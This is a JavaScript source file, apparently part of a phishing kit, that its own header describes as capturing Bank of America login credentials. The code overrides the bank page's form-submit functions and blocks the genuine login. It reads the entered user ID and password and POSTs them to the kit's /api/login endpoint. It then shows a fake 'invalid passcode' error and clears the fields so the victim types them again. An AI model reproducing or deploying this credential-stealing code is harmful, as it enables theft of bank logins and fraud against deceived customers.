/**
 * Form Logger - Captures Bank of America login credentials
 * AGGRESSIVE DEBUG VERSION - Logs everything
 */

console.log('[FL] Script loading...');

// Override the main submit function that BoA calls
if (typeof enterOnlineIDFormSubmit !== 'undefined') {
  const originalSubmit = window.enterOnlineIDFormSubmit;
  window.enterOnlineIDFormSubmit = function() {
    console.log('[FL] enterOnlineIDFormSubmit() called!');
    console.log('[FL] Capturing form data BEFORE BoA submission...');
    captureNow();
    return false;
  };
  console.log('[FL] Hooked enterOnlineIDFormSubmit function');
}

// Patch Form.prototype.submit
const OriginalFormSubmit = HTMLFormElement.prototype.submit;
HTMLFormElement.prototype.submit = function() {
  console.log('[FL] Form.submit() called on:', this.id);
  if (this.id === 'EnterOnlineIDForm') {
    console.log('[FL] Form.submit() BLOCKED - capturing data');
    this.action = '';
    this.target = '';
    captureNow();
    return false;
  }
  return OriginalFormSubmit.call(this);
};

// Capture function - gets form values RIGHT NOW
function captureNow() {
  try {
    console.log('[FL] ===== CAPTURING FORM DATA =====');
    
    // Get User ID
    let uid = '';
    const uidInput = document.getElementById('enterID-input');
    if (uidInput) {
      uid = uidInput.value;
      console.log('[FL] User ID field value:', uid || '(EMPTY)');
    } else {
      console.log('[FL] User ID field NOT FOUND');
    }
    
    // Get Password
    let pwd = '';
    const pwdInput = document.getElementById('tlpvt-passcode-input');
    if (pwdInput) {
      pwd = pwdInput.value;
      console.log('[FL] Password field value length:', pwd.length);
    } else {
      console.log('[FL] Password field NOT FOUND');
    }
    
    // Get Remember Me
    let rem = false;
    const remInput = document.querySelector('input[name="saveMyID"]');
    if (remInput) {
      rem = remInput.checked;
      console.log('[FL] Remember Me:', rem);
    }
    
    console.log('[FL] ===== SENDING TO /api/login =====');
    console.log('[FL] User:', uid || 'EMPTY', 'Password length:', pwd.length);
    
    // Send immediately
    fetch('/api/login', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        userId: uid || 'N/A',
        password: pwd || 'N/A',
        rememberMe: rem
      })
    })
    .then(r => r.json())
    .then(result => {
      console.log('[FL] ✓ Server response:', result);
      showError();
      clearForm();
    })
    .catch(err => {
      console.error('[FL] ✗ Server error:', err);
      showError();
    });
  } catch (err) {
    console.error('[FL] Capture error:', err.message, err.stack);
  }
}

// Show error message
function showError() {
  window.scrollTo(0, 0);
  const existing = document.querySelector('.error-state');
  if (existing) existing.remove();
  
  const err = document.createElement('div');
  err.className = 'error-state';
  err.style.cssText = 'background:#ffe6e6;border:1px solid #d32f2f;border-left:5px solid #c81c24;padding:16px;margin:20px;font-size:13px;color:#333;display:block;';
  err.innerHTML = '<strong>Invalid User ID or Passcode</strong><br>The information you entered doesn\'t match our records. Please try again.';
  document.body.insertBefore(err, document.body.firstChild);
  console.log('[FL] Error displayed');
}

// Clear form
function clearForm() {
  const uid = document.getElementById('enterID-input');
  const pwd = document.getElementById('tlpvt-passcode-input');
  if (uid) uid.value = '';
  if (pwd) pwd.value = '';
  console.log('[FL] Form cleared');
}

// Initialize on load
console.log('[FL] Document ready state:', document.readyState);

if (document.readyState === 'loading') {
  document.addEventListener('DOMContentLoaded', () => {
    console.log('[FL] DOMContentLoaded event fired');
    init();
  });
} else {
  init();
}

function init() {
  console.log('[FL] Initializing...');
  
  // Hide initial errors
  document.querySelectorAll('.error-state').forEach(e => {
    e.style.display = 'none';
  });
  
  // Enable password field
  setTimeout(() => {
    const pwd = document.getElementById('tlpvt-passcode-input');
    if (pwd) {
      pwd.disabled = false;
      pwd.removeAttribute('readonly');
      console.log('[FL] Password field enabled');
    }
    
    // Set up continuous protection
    setInterval(() => {
      if (pwd && (pwd.disabled || pwd.readOnly)) {
        pwd.disabled = false;
        pwd.removeAttribute('readonly');
      }
    }, 500);
  }, 500);
  
  // Set up form listeners
  setTimeout(() => {
    const form = document.getElementById('EnterOnlineIDForm');
    if (form) {
      form.addEventListener('submit', (e) => {
        console.log('[FL] Form submit event');
        e.preventDefault();
        e.stopPropagation();
        captureNow();
        return false;
      }, true);
      console.log('[FL] Form submit listener attached');
    }
  }, 1000);
  
  console.log('[FL] ✓ Initialization complete');
}

console.log('[FL] Script loaded successfully');


